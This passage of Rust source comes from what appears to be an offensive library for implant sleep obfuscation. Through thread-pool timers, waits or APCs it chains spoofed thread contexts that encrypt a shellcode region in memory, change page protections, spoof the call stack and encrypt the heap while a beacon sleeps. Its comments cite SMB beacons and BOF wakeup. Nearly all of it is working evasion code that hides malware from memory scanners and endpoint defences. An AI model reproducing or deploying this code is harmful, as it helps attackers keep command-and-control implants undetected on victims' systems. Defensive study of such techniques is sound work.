use alloc::string::String;
use core::{ffi::c_void, mem::zeroed, ptr::null_mut};

use uwd::AsPointer;
use anyhow::{Result, bail};
use obfstr::{obfstr as obf, obfstring as s};
use dinvk::winapis::{
    NtCurrentProcess,
    NtCurrentThread,
    NT_SUCCESS
};
use dinvk::types::{
    LARGE_INTEGER, CONTEXT,
    EVENT_ALL_ACCESS, EVENT_TYPE, 
    NTSTATUS
};

use crate::{types::*, winapis::*};
use crate::config::{Config, init_config, current_rsp};
use crate::gadget::GadgetContext;
use crate::allocator::HypnusHeap;

/// Initiates execution obfuscation using the `TpSetTimer`.
///
/// # Example
/// 
/// ```
/// #![no_std]
/// #![no_main]
///
/// extern crate alloc;
/// 
/// use hypnus::{foliage, ObfMode};
/// use hypnus::allocator::HypnusHeap;
/// use core::ffi::c_void;
/// 
/// #[global_allocator]
/// static ALLOCATOR: HypnusHeap = HypnusHeap;
/// 
/// // Pointer to the memory region you want to obfuscate (e.g., shellcode)
/// let data = b"\x90\x90\x90\xCC";
/// let ptr = data.as_ptr() as *mut c_void;
/// let size = data.len() as u64;
///
/// // Sleep duration in seconds
/// let delay = 5;
/// loop {
///     // Full obfuscation with heap encryption and RWX memory protection
///     timer!(ptr, size, delay, ObfMode::Heap | ObfMode::Rwx);
/// }
/// ```
#[macro_export]
macro_rules! timer {
    ($base:expr, $size:expr, $time:expr) => {
        $crate::__private::hypnus_entry(
            $base, 
            $size, 
            $time, 
            $crate::Obfuscation::Timer, 
            $crate::ObfMode::None
        )
    };

    ($base:expr, $size:expr, $time:expr, $mode:expr) => {
        $crate::__private::hypnus_entry(
            $base, 
            $size, 
            $time, 
            $crate::Obfuscation::Timer, 
            $mode
        )
    };
}

/// Initiates execution obfuscation using the `TpSetWait`.
///
/// # Example
/// 
/// ```
/// #![no_std]
/// #![no_main]
///
/// extern crate alloc;
/// 
/// use hypnus::{foliage, ObfMode};
/// use hypnus::allocator::HypnusHeap;
/// use core::ffi::c_void;
/// 
/// #[global_allocator]
/// static ALLOCATOR: HypnusHeap = HypnusHeap;
/// 
/// // Pointer to the memory region you want to obfuscate (e.g., shellcode)
/// let data = b"\x90\x90\x90\xCC";
/// let ptr = data.as_ptr() as *mut c_void;
/// let size = data.len() as u64;
///
/// // Sleep duration in seconds
/// let delay = 5;
/// loop {
///     // Full obfuscation with heap encryption and RWX memory protection
///     wait!(ptr, size, delay, ObfMode::Heap | ObfMode::Rwx);
/// }
/// ```
#[macro_export]
macro_rules! wait {
    ($base:expr, $size:expr, $time:expr) => {
        $crate::__private::hypnus_entry(
            $base, 
            $size, 
            $time, 
            $crate::Obfuscation::Wait, 
            $crate::ObfMode::None
        )
    };

    ($base:expr, $size:expr, $time:expr, $mode:expr) => {
        $crate::__private::hypnus_entry(
            $base, 
            $size, 
            $time, 
            $crate::Obfuscation::Wait, 
            $mode
        )
    };
}

/// Initiates execution obfuscation using the `NtQueueApcThread`.
///
/// # Example
/// 
/// ```
/// #![no_std]
/// #![no_main]
///
/// extern crate alloc;
/// 
/// use hypnus::{foliage, ObfMode};
/// use hypnus::allocator::HypnusHeap;
/// use core::ffi::c_void;
/// 
/// #[global_allocator]
/// static ALLOCATOR: HypnusHeap = HypnusHeap;
/// 
/// // Pointer to the memory region you want to obfuscate (e.g., shellcode)
/// let data = b"\x90\x90\x90\xCC";
/// let ptr = data.as_ptr() as *mut c_void;
/// let size = data.len() as u64;
///
/// // Sleep duration in seconds
/// let delay = 5;
/// loop {
///     // Full obfuscation with heap encryption and RWX memory protection
///     foliage!(ptr, size, delay, ObfMode::Heap | ObfMode::Rwx);
/// }
/// ```
#[macro_export]
macro_rules! foliage {
    ($base:expr, $size:expr, $time:expr) => {
        $crate::__private::hypnus_entry(
            $base, 
            $size, 
            $time, 
            $crate::Obfuscation::Foliage, 
            $crate::ObfMode::None
        )
    };

    ($base:expr, $size:expr, $time:expr, $mode:expr) => {
        $crate::__private::hypnus_entry(
            $base, 
            $size, 
            $time, 
            $crate::Obfuscation::Foliage, 
            $mode
        )
    };
}

// =============================================================================
// Handle-based macros with WakeReason return
// =============================================================================

/// Initiates execution obfuscation using `TpSetTimer` with custom wait primitive.
/// Returns `WakeReason` indicating which handle was signaled or if timeout occurred.
///
/// # Example
/// ```ignore
/// use hypnus::{timer_wait, WaitPrimitive, WakeReason, ObfMode};
/// 
/// // Wait on a single event with 5 second timeout
/// let reason = timer_wait!(ptr, size, WaitPrimitive::single(event, 5000), ObfMode::Rwx);
/// match reason {
///     WakeReason::Handle0 => println!("Event signaled!"),
///     WakeReason::Timeout => println!("Timeout"),
///     _ => {}
/// }
/// ```
#[macro_export]
macro_rules! timer_wait {
    ($base:expr, $size:expr, $wait:expr) => {
        $crate::__private::hypnus_entry_with_wait(
            $base, 
            $size, 
            $wait, 
            $crate::Obfuscation::Timer, 
            $crate::ObfMode::None
        )
    };

    ($base:expr, $size:expr, $wait:expr, $mode:expr) => {
        $crate::__private::hypnus_entry_with_wait(
            $base, 
            $size, 
            $wait, 
            $crate::Obfuscation::Timer, 
            $mode
        )
    };
}

/// Initiates execution obfuscation using `TpSetWait` with custom wait primitive.
/// Returns `WakeReason` indicating which handle was signaled or if timeout occurred.
#[macro_export]
macro_rules! wait_handles {
    ($base:expr, $size:expr, $wait:expr) => {
        $crate::__private::hypnus_entry_with_wait(
            $base, 
            $size, 
            $wait, 
            $crate::Obfuscation::Wait, 
            $crate::ObfMode::None
        )
    };

    ($base:expr, $size:expr, $wait:expr, $mode:expr) => {
        $crate::__private::hypnus_entry_with_wait(
            $base, 
            $size, 
            $wait, 
            $crate::Obfuscation::Wait, 
            $mode
        )
    };
}

/// Initiates execution obfuscation using `NtQueueApcThread` with custom wait primitive.
/// Returns `WakeReason` indicating which handle was signaled or if timeout occurred.
#[macro_export]
macro_rules! foliage_wait {
    ($base:expr, $size:expr, $wait:expr) => {
        $crate::__private::hypnus_entry_with_wait(
            $base, 
            $size, 
            $wait, 
            $crate::Obfuscation::Foliage, 
            $crate::ObfMode::None
        )
    };

    ($base:expr, $size:expr, $wait:expr, $mode:expr) => {
        $crate::__private::hypnus_entry_with_wait(
            $base, 
            $size, 
            $wait, 
            $crate::Obfuscation::Foliage, 
            $mode
        )
    };
}

/// Enumeration of supported memory obfuscation strategies.
pub enum Obfuscation {
    /// The technique using Windows thread pool (`TpSetTimer`).
    Timer,

    /// The technique using Windows thread pool (`TpSetWait`).
    Wait,

    /// The technique using APC (`NtQueueApcThread`).
    Foliage,
}

/// Represents bit-by-bit options for performing obfuscation in different modes
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
#[repr(transparent)]
pub struct ObfMode(pub u32);

impl ObfMode {
    /// No additional obfuscation modes are used.
    pub const None: Self = ObfMode(0b0000);

    /// Enables heap encryption.
    pub const Heap: Self = ObfMode(0b0001);

    /// Allows RWX protected memory regions.
    pub const Rwx: Self = ObfMode(0b0010);

    /// Checks whether the flag contains another `ObfMode`.
    fn contains(self, other: ObfMode) -> bool {
        (self.0 & other.0) == other.0
    }
}

impl core::ops::BitOr for ObfMode {
    type Output = Self;

    /// Combines two `ObfMode` flags using bitwise OR.
    fn bitor(self, rhs: Self) -> Self::Output {
        ObfMode(self.0 | rhs.0)
    }
}

/// Specifies what to wait on during obfuscated sleep.
/// 
/// This enables waiting on external handles (like pipe events) in addition to
/// or instead of a simple timeout, supporting async BOF wakeup and SMB beacons.
///
/// # Wake Reason Detection
///
/// When using `WaitPrimitive::Handles`, the `WaitForMultipleObjects` return value
/// is captured directly in the ROP chain via a trampoline mechanism. This provides
/// reliable wake reason detection for both auto-reset and manual-reset events.
///
/// ## How It Works
///
/// A small trampoline function wraps the WFMO call in the ROP chain:
/// 1. The trampoline receives a pointer to result storage as an extra parameter
/// 2. It calls WaitForMultipleObjects with the original parameters
/// 3. It stores RAX (the return value) to the result storage before returning
///
/// This ensures the WFMO result is captured before NtContinue overwrites RAX
/// in the next ROP chain step.
#[derive(Clone, Copy, Debug)]
pub enum WaitPrimitive {
    /// Wait for a specified duration (original behavior).
    /// The thread handle is used internally with a timeout.
    Timeout {
        /// Duration in seconds
        seconds: u64,
    },
    
    /// Wait on external handles with optional timeout.
    /// Uses WaitForMultipleObjects to wait on up to MAXIMUM_WAIT_OBJECTS handles.
    ///
    /// Wake reason detection is reliable for both auto-reset and manual-reset events
    /// thanks to the WFMO trampoline that captures the result during ROP execution.
    Handles {
        /// Array of handles to wait on (up to 4 for stack allocation)
        handles: [*mut c_void; 4],
        /// Number of valid handles in the array
        count: usize,
        /// Timeout in milliseconds, or INFINITE (0xFFFFFFFF) for no timeout
        timeout_ms: u32,
    },
}

impl WaitPrimitive {
    /// Create a timeout-based wait (original behavior)
    pub fn timeout(seconds: u64) -> Self {
        Self::Timeout { seconds }
    }
    
    /// Create a single-handle wait with optional timeout
    pub fn single(handle: *mut c_void, timeout_ms: u32) -> Self {
        Self::Handles {
            handles: [handle, null_mut(), null_mut(), null_mut()],
            count: 1,
            timeout_ms,
        }
    }
    
    /// Create a dual-handle wait (e.g., primary + wakeup event)
    pub fn dual(handle1: *mut c_void, handle2: *mut c_void, timeout_ms: u32) -> Self {
        Self::Handles {
            handles: [handle1, handle2, null_mut(), null_mut()],
            count: 2,
            timeout_ms,
        }
    }
    
    /// Create a multi-handle wait (up to 4 handles)
    pub fn multi(handles: &[*mut c_void], timeout_ms: u32) -> Self {
        let mut arr = [null_mut(); 4];
        let count = handles.len().min(4);
        for (i, h) in handles.iter().take(count).enumerate() {
            arr[i] = *h;
        }
        Self::Handles {
            handles: arr,
            count,
            timeout_ms,
        }
    }
}

/// Indicates why the obfuscated wait returned.
///
/// Wake reason detection is accurate for both `WaitPrimitive::Timeout` and
/// `WaitPrimitive::Handles` waits. For handle-based waits, the WFMO return
/// value is captured directly in the ROP chain via a trampoline mechanism,
/// ensuring reliable detection for both auto-reset and manual-reset events.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum WakeReason {
    /// Timeout expired (original timer-based sleep behavior).
    Timeout,
    
    /// First handle (index 0) was signaled
    Handle0,
    
    /// Second handle (index 1) was signaled  
    Handle1,
    
    /// Third handle (index 2) was signaled
    Handle2,
    
    /// Fourth handle (index 3) was signaled
    Handle3,
    
    /// Wait failed or was abandoned
    Error,
}

impl WakeReason {
    /// Create from WaitForMultipleObjects return value
    pub fn from_wfmo_result(result: u32, handle_count: usize) -> Self {
        if result == WAIT_TIMEOUT {
            return Self::Timeout;
        }
        if result == WAIT_FAILED {
            return Self::Error;
        }
        let index = result.wrapping_sub(WAIT_OBJECT_0) as usize;
        if index < handle_count {
            match index {
                0 => Self::Handle0,
                1 => Self::Handle1,
                2 => Self::Handle2,
                3 => Self::Handle3,
                _ => Self::Error,
            }
        } else {
            Self::Error
        }
    }
    
    /// Check if a specific handle was signaled
    pub fn is_handle(&self, index: usize) -> bool {
        match (self, index) {
            (Self::Handle0, 0) => true,
            (Self::Handle1, 1) => true,
            (Self::Handle2, 2) => true,
            (Self::Handle3, 3) => true,
            _ => false,
        }
    }
}

/// Structure responsible for centralizing memory obfuscation techniques
#[derive(Clone, Copy, Debug)]
struct Hypnus {
    /// Base memory pointer to be manipulated or operated on.
    base: u64,

    /// Size of the memory region.
    size: u64,

    /// What to wait on during sleep
    wait: WaitPrimitive,

    /// Resolved WinAPI functions required for execution.
    cfg: &'static Config,

    /// Obfuscation modes.
    mode: ObfMode,
}

impl Hypnus {
    /// Creates a new `Hypnus` with timeout-based wait (backwards compatible).
    #[inline]
    fn new(base: u64, size: u64, time: u64, mode: ObfMode) -> Result<Self> {
        if base == 0 || size == 0 || time == 0 {
            bail!(s!("invalid arguments"))
        }

        Ok(Self {
            base,
            size,
            wait: WaitPrimitive::timeout(time),
            mode,
            cfg: init_config()?,
        })
    }
    
    /// Creates a new `Hypnus` with custom wait primitive.
    #[inline]
    fn new_with_wait(base: u64, size: u64, wait: WaitPrimitive, mode: ObfMode) -> Result<Self> {
        if base == 0 || size == 0 {
            bail!(s!("invalid arguments"))
        }

        Ok(Self {
            base,
            size,
            wait,
            mode,
            cfg: init_config()?,
        })
    }

    /// Performs memory obfuscation using a thread-pool timer sequence.
    /// 
    /// # Arguments
    /// * `wfmo_result_ptr` - Optional pointer to store WaitForMultipleObjects result.
    ///   When non-null and using `WaitPrimitive::Handles`, the WFMO result is captured
    ///   via a trampoline during ROP chain execution.
    fn timer(&mut self, wfmo_result_ptr: *mut u64) -> Result<()> {
        unsafe {
            // Determine if heap obfuscation and RWX memory should be use
            let heap = self.mode.contains(ObfMode::Heap);
            let protection = if self.mode.contains(ObfMode::Rwx) {
                PAGE_EXECUTE_READWRITE
            } else {
                PAGE_EXECUTE_READ
            };

            // Initialize two synchronization events
            let mut events = [null_mut(); 3];
            for event in &mut events {
                let status = NtCreateEvent(
                    event, 
                    EVENT_ALL_ACCESS, 
                    null_mut(), 
                    EVENT_TYPE::NotificationEvent, 
                    0
                );
                
                if !NT_SUCCESS(status) {
                    bail!(s!("NtCreateEvent Failed"));
                }
            }

            // Allocate dedicated threadpool with one worker
            let mut pool = null_mut();
            let mut status = TpAllocPool(&mut pool, null_mut());
            if !NT_SUCCESS(status) {
                bail!(s!("TpAllocPool Failed"));
            }

            // Configure threadpool stack sizes
            let mut stack = TP_POOL_STACK_INFORMATION { StackCommit: 0x80000, StackReserve: 0x80000 };
            status = TpSetPoolStackInformation(pool, &mut stack);
            if !NT_SUCCESS(status) {
                bail!(s!("TpSetPoolStackInformation Failed"));
            }

            TpSetPoolMinThreads(pool, 1);
            TpSetPoolMaxThreads(pool, 1);

            // Prepare callback environment
            let mut env = TP_CALLBACK_ENVIRON_V3 { Pool: pool, ..Default::default() };

            // Capture the current thread context
            let mut timer_ctx = null_mut();
            let mut ctx_init = CONTEXT {
                ContextFlags: CONTEXT_FULL,
                P1Home: self.cfg.rtl_capture_context.as_u64(),
                ..Default::default()
            };

            // The trampoline is needed because thread pool passes the parameter in RDX, not RCX.
            // The trampoline moves RDX to RCX and jumps to CONTEXT.P1Home (RtlCaptureContext),
            // ensuring a clean transition with no extra instructions before context capture.
            status = TpAllocTimer(
                &mut timer_ctx, 
                self.cfg.trampoline as *mut c_void, 
                &mut ctx_init as *mut _ as *mut c_void, 
                &mut env
            );
            
            if !NT_SUCCESS(status) {
                bail!(s!("TpAllocTimer [RtlCaptureContext] Failed"));
            }

            let mut delay = zeroed::<LARGE_INTEGER>();
            delay.QuadPart = -(100i64 * 10_000);
            TpSetTimer(timer_ctx, &mut delay, 0, 0);

            // Signal after RtlCaptureContext finishes
            let mut timer_event = null_mut();
            status = TpAllocTimer(
                &mut timer_event, 
                NtSetEvent2 as *mut c_void, 
                events[0], 
                &mut env
            );
            
            if !NT_SUCCESS(status) {
                bail!(s!("TpAllocTimer [NtSetEvent] Failed"));
            }

            delay.QuadPart = -(200i64 * 10_000);
            TpSetTimer(timer_event, &mut delay, 0, 0);

            // Wait for context capture to complete
            status = NtWaitForSingleObject(events[0], 0, null_mut());
            if !NT_SUCCESS(status) {
                bail!(s!("NtWaitForSingleObject Failed"));
            }

            // Build multi-step spoofed CONTEXT chain
            let mut ctxs = [ctx_init; 10];
            for ctx in &mut ctxs {
                ctx.Rax = self.cfg.nt_continue.as_u64();
                ctx.Rsp -= 8;
            }

            // Duplicate thread handle for context manipulation
            let mut h_thread = null_mut();
            status = NtDuplicateObject(
                NtCurrentProcess(),
                NtCurrentThread(),
                NtCurrentProcess(),
                &mut h_thread,
                0,
                0,
                DUPLICATE_SAME_ACCESS,
            );

            if !NT_SUCCESS(status) {
                bail!(s!("NtDuplicateObject Failed"));
            }

            // Base CONTEXT for spoofing
            ctx_init.Rsp = current_rsp();
            let mut ctx_spoof = self.cfg.stack.spoof_context(self.cfg, ctx_init);

            // The chain will wait until `event` is signaled
            ctxs[0].jmp(self.cfg, self.cfg.nt_wait_for_single.into());
            ctxs[0].Rcx = events[1] as u64;
            ctxs[0].Rdx = 0;
            ctxs[0].R8  = 0;

            // Temporary RW access
            let mut old_protect = 0u32;
            let (mut base, mut size) = (self.base, self.size);
            ctxs[1].jmp(self.cfg, self.cfg.nt_protect_virtual_memory.into());
            ctxs[1].Rcx = NtCurrentProcess() as u64;
            ctxs[1].Rdx = base.as_u64();
            ctxs[1].R8  = size.as_u64();
            ctxs[1].R9  = PAGE_READWRITE as u64;

            // Encrypt region
            ctxs[2].jmp(self.cfg, self.cfg.system_function040.into());
            ctxs[2].Rcx = base;
            ctxs[2].Rdx = size;
            ctxs[2].R8  = 0;

            // Backup context
            let mut ctx_backup = CONTEXT { ContextFlags: CONTEXT_FULL, ..Default::default() };
            ctxs[3].jmp(self.cfg, self.cfg.nt_get_context_thread.into());
            ctxs[3].Rcx = h_thread as u64;
            ctxs[3].Rdx = ctx_backup.as_u64();

            // Inject spoofed context
            ctxs[4].jmp(self.cfg, self.cfg.nt_set_context_thread.into());
            ctxs[4].Rcx = h_thread as u64;
            ctxs[4].Rdx = ctx_spoof.as_u64();

            // Sleep/Wait - setup based on WaitPrimitive
            // Storage for handle array (must live until ROP chain completes)
            let mut handle_storage: [*mut c_void; 4] = [null_mut(); 4];
            // Track if we're using handle-based wait for stack parameter setup
            let mut using_wfmo_trampoline = false;
            
            match self.wait {
                WaitPrimitive::Timeout { seconds } => {
                    // Original behavior: WaitForSingleObject on thread handle with timeout
                    ctxs[5].jmp(self.cfg, self.cfg.wait_for_single.into());
                    ctxs[5].Rcx = h_thread as u64;
                    ctxs[5].Rdx = seconds * 1000;
                    ctxs[5].R8  = 0;
                }
                WaitPrimitive::Handles { handles, count, timeout_ms } => {
                    // Use WFMO trampoline to capture the return value
                    handle_storage = handles;
                    using_wfmo_trampoline = !wfmo_result_ptr.is_null();
                    
                    if using_wfmo_trampoline {
                        // Call trampoline which wraps WFMO and stores result
                        ctxs[5].jmp(self.cfg, self.cfg.wfmo_trampoline);
                    } else {
                        // Direct WFMO call (result will be lost)
                        ctxs[5].jmp(self.cfg, self.cfg.wait_for_multiple.into());
                    }
                    ctxs[5].Rcx = count as u64;
                    ctxs[5].Rdx = handle_storage.as_ptr() as u64;
                    ctxs[5].R8  = 0; // bWaitAll = FALSE
                    ctxs[5].R9  = timeout_ms as u64;
                    // 5th and 6th params (result_ptr, wfmo_addr) are written after spoof()
                }
            }

            // Decrypt region
            ctxs[6].jmp(self.cfg, self.cfg.system_function041.into());
            ctxs[6].Rcx = base;
            ctxs[6].Rdx = size;
            ctxs[6].R8  = 0;

            // Restore protection
            ctxs[7].jmp(self.cfg, self.cfg.nt_protect_virtual_memory.into());
            ctxs[7].Rcx = NtCurrentProcess() as u64;
            ctxs[7].Rdx = base.as_u64();
            ctxs[7].R8  = size.as_u64();
            ctxs[7].R9  = protection;

            // Restore thread context
            ctxs[8].jmp(self.cfg, self.cfg.nt_set_context_thread.into());
            ctxs[8].Rcx = h_thread as u64;
            ctxs[8].Rdx = ctx_backup.as_u64();

            // Final event notification
            ctxs[9].jmp(self.cfg, self.cfg.nt_set_event.into());
            ctxs[9].Rcx = events[2] as u64;
            ctxs[9].Rdx = 0;

            // Layout spoofed CONTEXT chain on stack
            self.cfg.stack.spoof(&mut ctxs, self.cfg, Obfuscation::Timer)?;
            
            // Ensure handle_storage lives through the ROP chain
            let _ = &handle_storage;

            // Patch old_protect into expected return slots
            ((ctxs[1].Rsp + 0x28) as *mut u64).write(old_protect.as_u64());
            ((ctxs[7].Rsp + 0x28) as *mut u64).write(old_protect.as_u64());
            
            // For WFMO trampoline, write 5th and 6th parameters to stack
            // [RSP+0x28] = result_ptr, [RSP+0x30] = wfmo_addr
            if using_wfmo_trampoline {
                ((ctxs[5].Rsp + 0x28) as *mut u64).write(wfmo_result_ptr as u64);
                ((ctxs[5].Rsp + 0x30) as *mut u64).write(self.cfg.wait_for_multiple.as_u64());
            }

            // Schedule each CONTEXT via TpSetTimer
            for ctx in &mut ctxs {
                let mut timer = null_mut();
                status = TpAllocTimer(
                    &mut timer, 
                    self.cfg.callback as *mut c_void, 
                    ctx as *mut _ as *mut c_void, 
                    &mut env
                );
                
                if !NT_SUCCESS(status) {
                    bail!(s!("TpAllocTimer Failed"));
                }

                // Add 100ms per step
                delay.QuadPart += -(100_i64 * 10_000);
                TpSetTimer(timer, &mut delay, 0, 0);
            }

            // Optional heap encryption
            let key = if heap {
                let key = core::arch::x86_64::_rdtsc().to_le_bytes();
                obfuscate_heap(&key);
                Some(key)
            } else {
                None
            };

            // Wait for chain completion
            status = NtSignalAndWaitForSingleObject(events[1], events[2], 0, null_mut());
            if !NT_SUCCESS(status) {
                bail!(s!("NtSignalAndWaitForSingleObject Failed"));
            }

            // Undo heap encryption
            if let Some(key) = key {
                obfuscate_heap(&key);
            }

            // Cleanup
            NtClose(h_thread);
            CloseThreadpool(pool);
            events.iter().for_each(|h| {
                NtClose(*h);
            });

            Ok(())
        }
    }

    /// Performs memory obfuscation using a thread-pool wait–based strategy.
    ///
    /// This strategy is similar to [`Hypnus::timer`], but uses `TpSetWait`
    /// instead of `TpSetTimer` to drive the spoofed CONTEXT chain.
    /// 
    /// # Arguments
    /// * `wfmo_result_ptr` - Optional pointer to store WaitForMultipleObjects result.
    ///   When non-null and using `WaitPrimitive::Handles`, the WFMO result is captured
    ///   via a trampoline during ROP chain execution.
    fn wait(&mut self, wfmo_result_ptr: *mut u64) -> Result<()> {
        unsafe {
            // Determine if heap obfuscation and RWX memory should be use
            let heap = self.mode.contains(ObfMode::Heap);
            let protection = if self.mode.contains(ObfMode::Rwx) {
                PAGE_EXECUTE_READWRITE
            } else {
                PAGE_EXECUTE_READ
            };

            // Events used to synchronize context capture and chain completion
            let mut events = [null_mut(); 4];
            for event in &mut events {
                let status = NtCreateEvent(
                    event, 
                    EVENT_ALL_ACCESS, 
                    null_mut(), 
                    EVENT_TYPE::NotificationEvent, 
                    0
                );
                
                if !NT_SUCCESS(status) {
                    bail!(s!("NtCreateEvent Failed"));
                }
            }

            // Allocate dedicated threadpool with one worker
            let mut pool = null_mut();
            let mut status = TpAllocPool(&mut pool, null_mut());
            if !NT_SUCCESS(status) {
                bail!(s!("TpAllocPool Failed"));
            }

            // Configure threadpool stack sizes
            let mut stack = TP_POOL_STACK_INFORMATION { StackCommit: 0x80000, StackReserve: 0x80000 };
            status = TpSetPoolStackInformation(pool, &mut stack);
            if !NT_SUCCESS(status) {
                bail!(s!("TpSetPoolStackInformation Failed"));
            }

            TpSetPoolMinThreads(pool, 1);
            TpSetPoolMaxThreads(pool, 1);

            // Prepare callback environment
            let mut env = TP_CALLBACK_ENVIRON_V3 { Pool: pool, ..Default::default() };

            // Capture the current thread context
            let mut wait_ctx = null_mut();
            let mut ctx_init = CONTEXT {
                ContextFlags: CONTEXT_FULL,
                P1Home: self.cfg.rtl_capture_context.as_u64(),
                ..Default::default()
            };

            // The trampoline is needed because thread pool passes the parameter in RDX, not RCX.
            // The trampoline moves RDX to RCX and jumps to CONTEXT.P1Home (RtlCaptureContext),
            // ensuring a clean transition with no extra instructions before context capture.
            status = TpAllocWait(
                &mut wait_ctx, 
                self.cfg.trampoline as *mut c_void, 
                &mut ctx_init as *mut _ as *mut c_void, 
                &mut env
            );

            if !NT_SUCCESS(status) {
                bail!(s!("TpAllocWait [RtlCaptureContext] Failed"));
            }

            let mut delay = zeroed::<LARGE_INTEGER>();
            delay.QuadPart = -(100i64 * 10_000);
            TpSetWait(wait_ctx, events[0], &mut delay);

            // Signal after RtlCaptureContext finishes
            let mut wait_event = null_mut();
            status = TpAllocWait(
                &mut wait_event, 
                NtSetEvent2 as *mut c_void, 
                events[1], 
                &mut env
            );
            
            if !NT_SUCCESS(status) {
                bail!(s!("TpAllocWait [NtSetEvent] Failed"));
            }

            delay.QuadPart = -(200i64 * 10_000);
            TpSetWait(wait_event, events[0], &mut delay);

            // Wait for context capture to complete
            status = NtWaitForSingleObject(events[1], 0, null_mut());
            if !NT_SUCCESS(status) {
                bail!(s!("NtWaitForSingleObject Failed"));
            }

            // Build multi-step spoofed CONTEXT chain
            let mut ctxs = [ctx_init; 10];
            for ctx in &mut ctxs {
                ctx.Rax = self.cfg.nt_continue.as_u64();
                ctx.Rsp -= 8;
            }

            // Duplicate thread handle for context manipulation
            let mut h_thread = null_mut();
            status = NtDuplicateObject(
                NtCurrentProcess(),
                NtCurrentThread(),
                NtCurrentProcess(),
                &mut h_thread,
                0,
                0,
                DUPLICATE_SAME_ACCESS,
            );

            if !NT_SUCCESS(status) {
                bail!(s!("NtDuplicateObject Failed"));
            }

            // Base CONTEXT for spoofing
            ctx_init.Rsp = current_rsp();
            let mut ctx_spoof = self.cfg.stack.spoof_context(self.cfg, ctx_init);

            // The chain will wait until `event` is signaled
            ctxs[0].jmp(self.cfg, self.cfg.nt_wait_for_single.into());
            ctxs[0].Rcx = events[2] as u64;
            ctxs[0].Rdx = 0;
            ctxs[0].R8  = 0;

            // Temporary RW access
            let mut old_protect = 0u32;
            let (mut base, mut size) = (self.base, self.size);
            ctxs[1].jmp(self.cfg, self.cfg.nt_protect_virtual_memory.into());
            ctxs[1].Rcx = NtCurrentProcess() as u64;
            ctxs[1].Rdx = base.as_u64();
            ctxs[1].R8  = size.as_u64();
            ctxs[1].R9  = PAGE_READWRITE as u64;

            // Encrypt region
            ctxs[2].jmp(self.cfg, self.cfg.system_function040.into());
            ctxs[2].Rcx = base;
            ctxs[2].Rdx = size;
            ctxs[2].R8  = 0;

            // Backup context
            let mut ctx_backup = CONTEXT { ContextFlags: CONTEXT_FULL, ..Default::default() };
            ctxs[3].jmp(self.cfg, self.cfg.nt_get_context_thread.into());
            ctxs[3].Rcx = h_thread as u64;
            ctxs[3].Rdx = ctx_backup.as_u64();

            // Inject spoofed context
            ctxs[4].jmp(self.cfg, self.cfg.nt_set_context_thread.into());
            ctxs[4].Rcx = h_thread as u64;
            ctxs[4].Rdx = ctx_spoof.as_u64();

            // Sleep/Wait - setup based on WaitPrimitive
            // Storage for handle array (must live until ROP chain completes)
            let mut handle_storage: [*mut c_void; 4] = [null_mut(); 4];
            // Track if we're using handle-based wait for stack parameter setup
            let mut using_wfmo_trampoline = false;
            
            match self.wait {
                WaitPrimitive::Timeout { seconds } => {
                    // Original behavior: WaitForSingleObject on thread handle with timeout
                    ctxs[5].jmp(self.cfg, self.cfg.wait_for_single.into());
                    ctxs[5].Rcx = h_thread as u64;
                    ctxs[5].Rdx = seconds * 1000;
                    ctxs[5].R8  = 0;
                }
                WaitPrimitive::Handles { handles, count, timeout_ms } => {
                    // Use WFMO trampoline to capture the return value
                    handle_storage = handles;
                    using_wfmo_trampoline = !wfmo_result_ptr.is_null();
                    
                    if using_wfmo_trampoline {
                        // Call trampoline which wraps WFMO and stores result
                        ctxs[5].jmp(self.cfg, self.cfg.wfmo_trampoline);
                    } else {
                        // Direct WFMO call (result will be lost)
                        ctxs[5].jmp(self.cfg, self.cfg.wait_for_multiple.into());
                    }
                    ctxs[5].Rcx = count as u64;
                    ctxs[5].Rdx = handle_storage.as_ptr() as u64;
                    ctxs[5].R8  = 0; // bWaitAll = FALSE
                    ctxs[5].R9  = timeout_ms as u64;
                    // 5th and 6th params (result_ptr, wfmo_addr) are written after spoof()
                }
            }

            // Decrypt region
            ctxs[6].jmp(self.cfg, self.cfg.system_function041.into());
            ctxs[6].Rcx = base;
            ctxs[6].Rdx = size;
            ctxs[6].R8  = 0;

            // Restore protection
            ctxs[7].jmp(self.cfg, self.cfg.nt_protect_virtual_memory.into());
            ctxs[7].Rcx = NtCurrentProcess() as u64;
            ctxs[7].Rdx = base.as_u64();
            ctxs[7].R8  = size.as_u64();
            ctxs[7].R9  = protection;

            // Restore thread context
            ctxs[8].jmp(self.cfg, self.cfg.nt_set_context_thread.into());
            ctxs[8].Rcx = h_thread as u64;
            ctxs[8].Rdx = ctx_backup.as_u64();

            // Final event notification
            ctxs[9].jmp(self.cfg, self.cfg.nt_set_event.into());
            ctxs[9].Rcx = events[3] as u64;
            ctxs[9].Rdx = 0;

            // Layout spoofed CONTEXT chain on stack
            self.cfg.stack.spoof(&mut ctxs, self.cfg, Obfuscation::Wait)?;
            
            // Ensure handle_storage lives through the ROP chain
            let _ = &handle_storage;

            // Patch old_protect into expected return slots
            ((ctxs[1].Rsp + 0x28) as *mut u64).write(old_protect.as_u64());
            ((ctxs[7].Rsp + 0x28) as *mut u64).write(old_protect.as_u64());
            
            // For WFMO trampoline, write 5th and 6th parameters to stack
            // [RSP+0x28] = result_ptr, [RSP+0x30] = wfmo_addr
            if using_wfmo_trampoline {
                ((ctxs[5].Rsp + 0x28) as *mut u64).write(wfmo_result_ptr as u64);
                ((ctxs[5].Rsp + 0x30) as *mut u64).write(self.cfg.wait_for_multiple.as_u64());
            }

            // Schedule each CONTEXT via TpAllocWait
            for ctx in &mut ctxs {
                let mut wait = null_mut();
                status = TpAllocWait(
                    &mut wait, 
                    self.cfg.callback as *mut c_void, 
                    ctx as *mut _ as *mut c_void, 
                    &mut env
                );

                if !NT_SUCCESS(status) {
                    bail!(s!("TpAllocWait Failed"));
                }

                // Add 100ms per step
                delay.QuadPart += -(100_i64 * 10_000);
                TpSetWait(wait, events[0], &mut delay);
            }

            // Optional heap encryption
            let key = if heap {
                let key = core::arch::x86_64::_rdtsc().to_le_bytes();
                obfuscate_heap(&key);
                Some(key)
            } else {
                None
            };

            // Wait for chain completion
            status = NtSignalAndWaitForSingleObject(events[2], events[3], 0, null_mut());
            if !NT_SUCCESS(status) {
                bail!(s!("NtSignalAndWaitForSingleObject Failed"));
            }

            // De-obfuscate heap if needed
            if let Some(key) = key {
                obfuscate_heap(&key);
            }

            // Cleanup
            NtClose(h_thread);
            CloseThreadpool(pool);
            events.iter().for_each(|h| {
                NtClose(*h);
            });

            Ok(())
        }
    }

